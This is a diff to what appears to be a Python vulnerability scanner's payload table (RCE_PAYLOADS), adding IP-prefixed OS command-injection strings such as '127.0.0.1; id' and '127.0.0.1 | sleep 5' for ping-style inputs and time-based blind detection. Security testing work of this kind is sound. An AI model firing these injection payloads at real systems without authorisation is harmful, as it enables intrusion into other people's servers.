@@ -125,6 +125,13 @@ RCE_PAYLOADS: dict[str, list[dict]] = {
         {"payload": "&& sleep 5", "desc": "链式+sleep"},
         {"payload": "|| sleep 5", "desc": "OR链+sleep"},
     ],
+    "ping_context": [
+        {"payload": "127.0.0.1; id", "desc": "IP前缀+分号+id"},
+        {"payload": "127.0.0.1 | id", "desc": "IP前缀+管道+id"},
+        {"payload": "127.0.0.1; sleep 5", "desc": "IP前缀+分号+sleep盲注"},
+        {"payload": "127.0.0.1 | sleep 5", "desc": "IP前缀+管道+sleep盲注"},
+        {"payload": "127.0.0.1 && id", "desc": "IP前缀+链式+id"},
+    ],
     "quick_scan": [
         {"payload": ";id", "desc": "Linux id"},
         {"payload": "|id", "desc": "Linux pipe"},
@@ -133,6 +140,8 @@ RCE_PAYLOADS: dict[str, list[dict]] = {
         {"payload": "&& whoami", "desc": "链式 whoami"},
         {"payload": "; sleep 5", "desc": "时间盲注-分号"},
         {"payload": "| sleep 5", "desc": "时间盲注-管道"},
+        {"payload": "127.0.0.1; sleep 5", "desc": "IP前缀时间盲注-分号"},
+        {"payload": "127.0.0.1 | sleep 5", "desc": "IP前缀时间盲注-管道"},
     ],
 }
 
